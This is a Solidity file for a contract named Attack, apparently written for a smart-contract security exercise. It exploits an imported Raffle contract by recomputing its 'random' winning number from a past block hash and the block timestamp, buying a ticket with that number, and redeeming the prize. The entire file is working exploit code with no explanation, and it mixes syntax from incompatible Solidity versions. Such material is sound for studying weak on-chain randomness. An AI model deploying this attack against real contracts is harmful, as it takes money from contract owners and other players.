// SPDX-License-Identifier: MIT
pragma solidity ^0.4.0;
import "./Raffle.sol";

contract Attack {
    Raffle rf;
    uint public debug;
    uint magicNumber;
    address adr;


    constructor(address _addr) public payable {
        rf = Raffle(_addr);
        adr = _addr;
    }

    function predict() public payable{
        debug = 5;
        magicNumber = (uint(keccak256(blockhash(block.number - 8), now)) % 19) + 1;
        

        debug = 1;
        rf.buyRafflewTicket.value(1 ether)(magicNumber);
        debug = 2;

        (bool success,) = address(rf).call(abi.encodeWithSignature("setter()"));
        require(success);
        debug = 3;
    }

    function getM() public view returns (uint) {
        uint magicNumber = (uint(keccak256(blockhash(block.number - 8), now)) % 19) + 1;
        return magicNumber;
    }

    function redeemPrize() public {
        rf.redeemPrize();
    }
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
